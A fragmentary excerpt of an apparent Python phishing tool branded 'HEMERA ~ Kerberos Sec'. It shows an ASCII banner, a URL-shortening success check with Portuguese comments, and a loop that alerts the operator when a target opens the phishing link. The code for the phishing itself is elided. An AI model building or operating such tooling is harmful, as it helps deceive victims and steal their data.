...
└══════════════════════════════════════════════════════════════┘ ''')
   ...
   0101010101        @@  |  /___\**   @@@2
   1101100101       @@@  |  |~L~ |*   @@@@@@
   0010010010      @@@@@ |   \=_/8    @@@@1@@    Banner By: Nina Butorac
   1010011001      @@@@@@| _ /| |\__ @@@@@@@@2
   1110101110     1@@@@@@|\  \___/)   @@1@@@@@2
   0110101011     2@@@@@ |  \ \ / |     @@@@@@2  [+]════[ Diego ]════[+]
   1111010001     2@@@@  |_  >   <|__    @@1@12
   1011010110     @@@@  / _|  / \/    \   @@1@
   1010111110     @@@ /  |^\/   |      |   @@1
   1110100011     @@ /     / ---- \ \\\=    @@   HEMERA ~ Kerberos Sec
   1010101010     @@ \___/ --------  ~~    @@@
   0110101110       @@@@@  | |   | |  --   @@ ''')
           ...
           if (server.status_code == 200): #Se o Encurtamento for bem sucedido, retornará o resultado ao usuário
             ...
             while (True):
               ...
               if (verificar_network == True):
                 print ("\n" + W + "[" + G + "+" + W + "]" + P + " O Alvo acessou o Phishing!")
                 print ("\n" + W + "[" + G + "+" + W + "]" + P + " Horário de acesso do Phishing:", hora_atual)
